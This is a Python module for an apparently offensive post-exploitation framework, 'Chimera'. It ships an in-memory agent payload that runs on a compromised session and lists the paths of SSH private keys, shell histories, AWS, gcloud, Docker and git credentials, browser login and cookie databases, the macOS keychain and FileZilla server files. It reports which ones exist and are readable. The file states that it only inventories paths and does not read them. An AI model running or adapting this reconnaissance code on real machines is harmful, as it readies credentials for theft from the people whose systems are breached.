# =============================================================================
# Chimera Post: Credential Harvest (path listing)
# =============================================================================
# SSH keys, history, .aws, browser DB path listesi — içerik çalmaz, yolları listeler.
# stdlib-only agent payload; disk yazma yok.
#
# KULLANIM:
#   use post/chimera/cred_harvest
#   set SESSION 1
#   run
# =============================================================================

from typing import Any

from core.module import BaseModule
from core.option import Option
from core.session_bridge import run_chimera_post_module

AGENT_CODE = r'''
"""Chimera in-memory: credential path harvester (list only, no disk write)."""
import os
import sys
import time


def _expand(path):
    return os.path.expandvars(os.path.expanduser(path))


def _exists_info(path):
    p = _expand(path)
    exists = os.path.exists(p)
    readable = False
    size = None
    if exists:
        try:
            readable = os.access(p, os.R_OK)
            if os.path.isfile(p):
                size = os.path.getsize(p)
        except Exception:
            pass
    return {"path": p, "exists": exists, "readable": readable, "size": size}


def _patterns():
    home = os.path.expanduser("~")
    linuxish = [
        ("SSH", "~/.ssh/id_rsa"),
        ("SSH", "~/.ssh/id_ed25519"),
        ("SSH", "~/.ssh/id_ecdsa"),
        ("SSH", "~/.ssh/authorized_keys"),
        ("SSH", "~/.ssh/config"),
        ("History", "~/.bash_history"),
        ("History", "~/.zsh_history"),
        ("History", "~/.python_history"),
        ("AWS", "~/.aws/credentials"),
        ("AWS", "~/.aws/config"),
        ("Cloud", "~/.config/gcloud/credentials.db"),
        ("Docker", "~/.docker/config.json"),
        ("Git", "~/.git-credentials"),
        ("Netrc", "~/.netrc"),
        ("DB", "~/.pgpass"),
        ("DB", "~/.my.cnf"),
    ]
    win = [
        ("SSH", r"%USERPROFILE%\.ssh\id_rsa"),
        ("SSH", r"%USERPROFILE%\.ssh\id_ed25519"),
        ("History", r"%USERPROFILE%\.bash_history"),
        ("AWS", r"%USERPROFILE%\.aws\credentials"),
        ("Browser", r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
        ("Browser", r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies"),
        ("Browser", r"%APPDATA%\Mozilla\Firefox\Profiles"),
        ("Browser", r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"),
        ("FileZilla", r"%APPDATA%\FileZilla\recentservers.xml"),
        ("FileZilla", r"%APPDATA%\FileZilla\sitemanager.xml"),
    ]
    darwin_extra = [
        ("Browser", "~/Library/Application Support/Google/Chrome/Default/Login Data"),
        ("Browser", "~/Library/Application Support/Firefox/Profiles"),
        ("Keychain", "~/Library/Keychains/login.keychain-db"),
    ]
    if sys.platform == "win32":
        return win
    items = list(linuxish)
    if sys.platform == "darwin":
        items.extend(darwin_extra)
    # Firefox profiles (linux)
    ff = os.path.join(home, ".mozilla", "firefox")
    if os.path.isdir(ff):
        items.append(("Browser", ff))
    chrome = os.path.join(home, ".config", "google-chrome", "Default", "Login Data")
    items.append(("Browser", chrome))
    return items


def run():
    lines = []
    lines.append("=== CHIMERA cred_harvest ===")
    lines.append("Tarih: %s" % time.strftime("%Y-%m-%d %H:%M:%S"))
    lines.append("Platform: %s | User home scan" % sys.platform)
    lines.append("")
    found = 0
    for category, pattern in _patterns():
        info = _exists_info(pattern)
        status = "YOK"
        if info["exists"]:
            found += 1
            status = "OK" if info["readable"] else "VAR(okunamaz)"
            size_s = (" %sB" % info["size"]) if info["size"] is not None else ""
            lines.append("[%s] %-10s %s%s" % (status, category, info["path"], size_s))
        else:
            lines.append("[%s] %-10s %s" % (status, category, info["path"]))
    lines.append("")
    lines.append("[+] Erisilebilir/mevcut aday: %s" % found)
    lines.append("(Icerik okunmaz; sadece yol envanteri)")
    return "\n".join(lines)


def ssh_only():
    lines = ["=== SSH key paths ==="]
    for category, pattern in _patterns():
        if category != "SSH":
            continue
        info = _exists_info(pattern)
        mark = "+" if info["exists"] else "-"
        lines.append("%s %s" % (mark, info["path"]))
    return "\n".join(lines)
'''


class cred_harvest(BaseModule):
    """Chimera oturumunda kimlik bilgisi yolu envanteri."""

    Name = "Chimera Cred Harvest"
    Description = (
        "Chimera session: SSH/history/AWS/browser DB yol listesi (stdlib, yazma yok)"
    )
    Author = "Mahmut P."
    Category = "post/chimera"
    Version = "1.0"

    def __init__(self) -> None:
        self.Options = {
            "SESSION": Option(
                name="SESSION",
                value="",
                required=True,
                description="Chimera session ID",
            ),
            "FUNC": Option(
                name="FUNC",
                value="run",
                required=False,
                description="Ajan fonksiyonu: run|ssh_only",
                choices=["run", "ssh_only"],
            ),
        }
        super().__init__()

    def run(self, options: dict[str, Any]) -> bool:
        func = str(options.get("FUNC", "run") or "run").strip() or "run"
        return run_chimera_post_module(
            options=options,
            module_name="cred_harvest",
            agent_source=AGENT_CODE,
            func_name=func,
        )
